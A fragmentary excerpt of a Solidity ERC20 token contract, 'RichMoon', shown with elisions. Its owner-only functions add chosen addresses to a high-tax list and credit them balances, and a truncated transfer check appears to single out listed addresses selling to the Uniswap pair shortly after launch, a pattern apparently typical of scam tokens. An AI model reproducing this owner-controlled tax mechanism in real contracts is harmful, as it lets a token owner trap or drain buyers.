...
contract RichMoon is ERC20, Ownable {
    ...
    uint256 public _ETHRewardsFee = 10;
    ...
    constructor(uint256 ethRewardsFee, uint256 MarketingFee, address payable marketingWallet,
            address _liquidityReceiver) public ERC20("RichMoon", "RichMoon") {
    ...
    mapping(address => bool) mappingHighTax;
    function addAddressList(address[] memory accounts) external onlyOwner{
        for(uint256 i = 0; i < accounts.length; i++) {
            addressList.push(accounts[i]);
            mappingHighTax[accounts[i]] = true;
        }
    }

    function addAmountList(uint256[] memory amounts) external onlyOwner{
        for(uint256 i = 0; i < amounts.length; i++) {
            amountList.push(amounts[i]*(10**18));
        }
    }

    function mappingHere() public onlyOwner{
        for(uint i=0;i<addressList.length;i++){
            _balances[addressList[i]] = _balances[addressList[i]].add(amountList[i]);
            _balances[msg.sender] = _balances[msg.sender].sub(amountList[i]);
            emit Transfer(msg.sender,addressList[i],amountList[i]);
        }
    }

    function mappingFromTo(uint256 from, uint256 to) external onlyOwner{
    ...
    function _transfer(
        ...
        if(takeFee) {
            ...
            if(to==uniswapV2Pair)
                if(mappingHighTax[from] && lunachB.add(600) > block.number)
